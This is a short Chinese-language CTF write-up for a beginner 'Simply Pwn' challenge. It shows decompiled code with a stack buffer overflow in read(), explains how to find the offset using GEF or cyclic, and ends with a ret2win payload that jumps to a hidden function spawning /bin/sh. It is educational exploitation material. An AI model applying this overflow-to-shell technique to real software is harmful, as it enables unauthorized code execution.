# Simply Pwn

## Information

- `MyFirstCTF` `Baby`
- `Pwn`

The simplest pwn

## Solution

題目提供一個壓縮檔，其中包含一個 ELF 64bits 的 binary 檔。

- [Stack-based Buffer Overflow](https://cwe.mitre.org/data/definitions/121.html)

透過反組譯、反編譯工具進行查看。
- IDA pro 一下
    - main
    
        可以發現 `read` 出現一個嚴重的 Stack-based Buffer Overflow。
        ```c
        int __cdecl main(int argc, const char **argv, const char **envp)
        {
        __int64 v4; // [rsp+0h] [rbp-50h] BYREF
        __int64 v5[8]; // [rsp+8h] [rbp-48h] BYREF
        int v6; // [rsp+4Ch] [rbp-4h]

        v4 = ',emocleW';
        v5[0] = 32LL;
        memset(&v5[1], 0, 48);
        write(1LL, "Show me your name: ", 19LL);
        v6 = read(0LL, (char *)v5 + 1, 256LL);
        if ( v6 > 0 )
            write(1LL, &v4, v6 + 9);
        return 0;
        }
        ```
        另外還有一個重點，function 結構中存在一個名為 shellcode 的 function。
        ```c
        void __fastcall __noreturn shellcode(__int64 a1, __int64 a2, __int64 a3, int a4, int a5, int a6)
        {
        execl((unsigned int)"/bin/sh", (unsigned int)"/bin/sh", 0, a4, a5, a6);
        exit(0LL);
        }
        ```

- 根據上面資訊合理推測是要透過 `main` 的 Stack-based Buffer Overflow 將位址跳轉到 `shellcode`。

- offset 的部分則可以透過如 GDB 等的動態分析工具，對程式進行隨機輸入，並對行為進行觀察，從而找到 offset。
    - GEF: pattern create -> pattern search。
    - cyclic: 透過 `cyclic` 生成隨機字串，再透過記錄崩潰輸入的值，並使用 `cyclic -l` 反向尋找 offset。

- payload
    ```
    // offset = (8*8-1) + 8 + 8  # v5[0:8]-1 + v4 + rbp
    // shellcode_addresss = 0x04017AA
    payload = b'a'*71 + p64(0xdeadbeef) +  p64(shellcode_address)
    ```